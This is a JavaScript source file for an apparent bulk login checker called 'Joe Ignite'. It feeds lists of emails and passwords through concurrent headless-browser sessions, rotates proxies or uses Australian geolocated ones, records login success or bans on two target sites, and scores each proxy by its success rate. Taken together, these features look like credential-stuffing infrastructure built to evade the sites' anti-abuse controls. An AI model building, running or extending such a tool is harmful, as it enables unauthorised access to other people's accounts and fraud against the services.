/**
 * Joe Ignite runner — orchestrates a queue of credentials with N concurrent workers.
 * Each worker: creates a BB session → runs runCredentialInSession → closes the session.
 */
import { bbClient } from '@/lib/bbClient';
import { base44 } from '@/api/base44Client';
import { JOE_IGNITE_CONFIG, finalOutcomeFromResults } from '@/lib/joeIgniteConfig';
import { runCredentialInSession } from '@/lib/joeIgniteCDP';
import { fetchEnabledProxies, toBrowserbaseProxy, createRoundRobinPicker } from '@/lib/proxyPool';

export async function runJoeIgniteBatch({
  credentials,
  concurrency = JOE_IGNITE_CONFIG.DEFAULT_CONCURRENCY,
  batchId,
  onRowUpdate,
  onComplete,
  shouldAbort,
  proxySource = 'none', // 'none' | 'bb-au' | 'pool'
}) {
  const queue = credentials.map((c, i) => ({ ...c, index: i }));
  const inflight = new Set();

  // Load external proxy pool only when selected
  const proxyPool = proxySource === 'pool' ? await fetchEnabledProxies().catch(() => []) : [];
  const pickProxy = createRoundRobinPicker(proxyPool);

  const runOne = async (cred) => {
    const update = (patch) => onRowUpdate?.({ email: cred.email, index: cred.index, ...patch });
    update({ status: 'running', startedAt: new Date().toISOString() });

    let session = null;
    let sessionId = null;
    let outcomeStatus = 'error';
    let attempts = 0;
    let results = { joe: null, ignition: null };
    let detailsTrail = [];
    const assignedProxy = proxySource === 'pool' ? pickProxy() : null;

    try {
      const sessionOpts = {
        browserSettings: { viewport: { width: 1366, height: 768 } },
        userMetadata: { launchedFrom: 'BBCommandCenter', testRun: 'joe_ignite', task: 'login-verify', email: cred.email, batchId, proxySource, proxyId: assignedProxy?.id },
      };
      if (proxySource === 'bb-au') {
        sessionOpts.proxies = [{ type: 'browserbase', geolocation: { country: 'AU' } }];
      } else if (assignedProxy) {
        sessionOpts.proxies = [toBrowserbaseProxy(assignedProxy)];
      }
      session = await bbClient.createSession(sessionOpts);
      sessionId = session.id;
      update({ sessionId });

      const run = await runCredentialInSession({
        connectUrl: session.connectUrl,
        email: cred.email,
        password: cred.password,
        onProgress: (p) => {
          if (p.phase === 'attempt-done') {
            detailsTrail.push(`Attempt ${p.attempt}: joe=${p.joe} ign=${p.ignition}`);
            update({ attempts: p.attempt, joeOutcome: p.joe, ignitionOutcome: p.ignition });
          } else {
            update({ attempts: p.attempt });
          }
        },
      });

      results = run.results;
      attempts = run.attempts;
      const finalOutcome = finalOutcomeFromResults(results);
      outcomeStatus = finalOutcome.toLowerCase();
    } catch (err) {
      detailsTrail.push(`FATAL: ${err.message}`);
      outcomeStatus = 'error';
    } finally {
      if (sessionId) {
        try { await bbClient.updateSession(sessionId); } catch {}
      }
    }

    const isBurned = outcomeStatus === 'success' || outcomeStatus === 'perm_ban';
    const payload = {
      batchId,
      email: cred.email,
      sessionId,
      status: outcomeStatus,
      attempts,
      joeOutcome: results.joe,
      ignitionOutcome: results.ignition,
      isBurned,
      details: detailsTrail.join(' | '),
      startedAt: new Date().toISOString(),
      endedAt: new Date().toISOString(),
    };

    try { await base44.entities.JoeIgniteRun.create(payload); } catch {}

    // Update proxy stats (fire-and-forget)
    if (assignedProxy?.id) {
      const isSuccess = outcomeStatus === 'success';
      base44.entities.ProxyPool.update(assignedProxy.id, {
        timesUsed: (assignedProxy.timesUsed || 0) + 1,
        successCount: (assignedProxy.successCount || 0) + (isSuccess ? 1 : 0),
        failureCount: (assignedProxy.failureCount || 0) + (isSuccess ? 0 : 1),
        lastUsedAt: new Date().toISOString(),
      }).catch(() => {});
    }

    const proxyLabel = proxySource === 'bb-au'
      ? 'BB AU'
      : (assignedProxy?.label || assignedProxy?.server || null);
    update({ ...payload, phase: 'done', proxyLabel });
  };

  // Worker pool
  const runNext = async () => {
    while (queue.length > 0) {
      if (shouldAbort?.()) return;
      const cred = queue.shift();
      inflight.add(cred.index);
      await runOne(cred);
      inflight.delete(cred.index);
    }
  };

  const workers = Array.from({ length: Math.max(1, concurrency) }, () => runNext());
  await Promise.all(workers);
  onComplete?.();
}